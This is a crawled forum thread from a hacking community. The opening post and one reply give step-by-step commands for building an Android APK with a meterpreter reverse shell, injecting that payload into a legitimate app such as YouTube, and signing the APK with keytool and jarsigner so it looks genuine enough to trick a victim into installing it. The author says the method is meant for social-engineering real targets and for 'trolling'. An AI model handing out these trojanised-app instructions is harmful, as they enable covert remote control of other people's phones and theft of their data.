<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Getting Shell on Android and signing the APK File - Social Engineering - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="As @pry0cc insisted that I create a post on how I manually signed a apk file in my post. As requested, here it is. Although please see this link here which is the reference that I used for my so called 1337 hax. Before I&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="3129.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Getting Shell on Android and signing the APK File&#39;" href="3129.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129" />
<meta name="twitter:url" content="https://0x00sec.org/t/getting-shell-on-android-and-signing-the-apk-file/3129" />
<meta property="og:title" content="Getting Shell on Android and signing the APK File" />
<meta name="twitter:title" content="Getting Shell on Android and signing the APK File" />
<meta property="og:description" content="As @pry0cc insisted that I create a post on how I manually signed a apk file in my post. As requested, here it is. Although please see this link here which is the reference that I used for my so called 1337 hax. Before I begin, what you’ll need is:   Metasploit Msfvenom Payload keytool jarsigner A brain (please)  #Generating apk file  The first step is of course generating the apk file with meterpreter embedded in the file, of course any payload is usable, but I used the payload; android/meterpr..." />
<meta name="twitter:description" content="As @pry0cc insisted that I create a post on how I manually signed a apk file in my post. As requested, here it is. Although please see this link here which is the reference that I used for my so called 1337 hax. Before I begin, what you’ll need is:   Metasploit Msfvenom Payload keytool jarsigner A brain (please)  #Generating apk file  The first step is of course generating the apk file with meterpreter embedded in the file, of course any payload is usable, but I used the payload; android/meterpr..." />
<meta property="og:article:section" content="Social Engineering" />
<meta property="og:article:section:color" content="652D90" />
<meta property="og:article:tag" content="metasploit" />
<meta property="og:article:tag" content="socialengineering" />
<meta property="og:article:tag" content="metasploitable" />
<meta property="og:article:tag" content="beginner" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="1 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="16 ❤" />
<meta property="article:published_time" content="2017-08-01T17:32:57+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="3129.html">Getting Shell on Android and signing the APK File</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/social-engineering/60.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #652D90"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Social Engineering</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/metasploit.html" class="discourse-tag" rel="tag">metasploit</a>,
<a href="../../tag/socialengineering.html" class="discourse-tag" rel="tag">socialengineering</a>,
<a href="../../tag/metasploitable.html" class="discourse-tag" rel="tag">metasploitable</a>,
<a href="../../tag/beginner.html" class="discourse-tag" rel="tag">beginner</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Getting Shell on Android and signing the APK File">
<meta itemprop="articleSection" content="Social Engineering">
<meta itemprop="keywords" content="metasploit, socialengineering, metasploitable, beginner">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Red_Joker"><span itemprop="name">Red_Joker</span></a>
(Matrix2600)
</span>
<link itemprop="mainEntityOfPage" href="3129.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-01T17:32:57Z" class="post-time">
August 1, 2017, 5:32pm
</time>
<meta itemprop="dateModified" content="2017-08-01T18:00:03Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>As <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> insisted that I create a post on how I manually signed a apk file in my <a href="https://0x00sec.org/t/mindless-trolling-with-meterpreter/3107/9">post</a>. As requested, here it is. Although please see this link <a href="http://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/#gref" rel="nofollow noopener">here</a> which is the reference that I used for my so called 1337 hax. Before I begin, what you’ll need is:</p>
<ul>
<li>Metasploit</li>
<li>Msfvenom</li>
<li>Payload</li>
<li>keytool</li>
<li>jarsigner</li>
<li>A brain (please)</li>
</ul>
<p><span class="hashtag">#Generating</span> apk file</p>
<p>The first step is of course generating the apk file with meterpreter embedded in the file, of course any payload is usable, but I used the payload; android/meterpreter/reverse_tcp with lport 8080 and my external IP address. The command I used was:<br>
<code>msfvenom -p android/meterpreter/reverse_tcp lhost=127.0.0.1 lport=8080 &gt; z.apk</code></p>
<p>Simple enough?</p>
<p>Of course you could try to just social engineer the apk file as it is, but I found that if you sign the apk file it is more “realistic”, but of course it is your choice.</p>
<p><span class="hashtag">#Signing</span> apk file</p>
<p>There are two tools you’ll need, Keytool and Jarsigner. The first step is generating the keystore. When I did this, I didn’t change much for the command used. Why? It was late and I really didn’t care that much.</p>
<p>Anyways, the command used was:<br>
<code>keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000</code></p>
<p>the command is pretty self explanatory.</p>
<p>Now it is time to sign the apk file using this command:<br>
<code>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore APPNAME.apk aliasname</code></p>
<p>Again, modify the flags as need be.</p>
<p>Of course, you could just verify the apk file with this command:<br>
<code>jarsigner -verify -verbose -certs APPNAME.apk</code></p>
<p>but I took the risk without checking the apk file because I’m a 1337 haxor.</p>
<p>And that’s it.</p>
<p><span class="hashtag">#Conclusion</span></p>
<p>Of course without having a victim it isn’t fun doing all this sooo hard work. I gotta admit, this is lazy and a skid move, but when it comes to SE, it works almost all the time if you do it right. I do not recommend you to use meterpreter unless you are trolling like I do and this will not work on those that are intelligent enough. I recommend your very own coded reverse shell above all else like these <a href="../remote-shells-part-i/269.html">tut</a> that <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> wrote which helped me out a lot to learn about reverse shells. Thank you!</p>
<p>Anyways, I think that basically wraps everything up at least for now and I hope this does clear up some confusion and some doubts.</p>
<p>Cheers!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="7" />
<span class="post-likes">7 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
(oaktree)
</span>
<link itemprop="mainEntityOfPage" href="3129.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-01T17:43:58Z" class="post-time">
August 1, 2017, 5:43pm
</time>
<meta itemprop="dateModified" content="2017-08-01T17:43:58Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Soo… say that this attack is used… it doesn’t seem like you’re covering your tracks…</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Red_Joker"><span itemprop="name">Red_Joker</span></a>
(Matrix2600)
</span>
<link itemprop="mainEntityOfPage" href="3129.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-01T17:46:08Z" class="post-time">
August 1, 2017, 5:46pm
</time>
<meta itemprop="dateModified" content="2017-08-01T17:46:08Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I understand that but that’s not the point here. My point is experimentation that I found which for some reason works, like a lot. I guess it is up for perspective and this is a very very very very skiddish move. That I understand which is why most should code their own reverse shell instead of meterpreter.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="3129.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-01T17:57:54Z" class="post-time">
August 1, 2017, 5:57pm
</time>
<meta itemprop="dateModified" content="2017-08-01T17:57:54Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Nice! This could be really helpful to a lot of people. I would, however, recommend changing the title, it is super vague, perhaps “Getting a Shell on Android and Signing the APK”?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/whatskrakan_01"><span itemprop="name">whatskrakan_01</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3129.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-01T20:32:11Z" class="post-time">
August 1, 2017, 8:32pm
</time>
<meta itemprop="dateModified" content="2017-08-01T20:40:47Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I recently have been playing around with Msfvenom and found that you can actually inject a payload inside an already legitimate .APK file. You can do this by downloading the app using a third party site, lets say we downloaded Youtube’s app or something. Say you wanted to set up a reverse TCP shell using Youtube.</p>
<p><code>msfvenom -x youtube.apk -p android/meterpreter/reverse_tcp LHOST=[YourIP] LPORT=[port of choice] -o [custom name for .APK file, something like youtubeV12.13.APK or something]</code></p>
<p>It should decompile the app, inject the payload, change the permissions and then load out the file with the name you selected.<br>
It should execute every time the target loads the app.</p>
<p>This is just for fun by the way, and I hope this doesn’t bring any, eh hem…unwanted attention…</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="3129.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-21T00:38:40Z" class="post-time">
January 21, 2018, 12:38am
</time>
<meta itemprop="dateModified" content="2018-01-21T00:38:40Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
